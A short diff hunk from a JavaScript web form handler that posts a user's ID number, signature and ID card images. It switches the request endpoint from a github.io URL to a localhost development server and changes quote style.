@@ -203,13 +203,13 @@ const sendInfo = async () => {
     });
   } else {
     user = {
-      phoneNumber:'',
+      phoneNumber: "",
       cedula: textCedula.value,
       firma: dataURL,
       frontImg: front,
       backImg: back,
     };
-    fetch("https://subvray.github.io/cecapia.github.io/data", {
+    fetch("http://localhost:5000/data", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
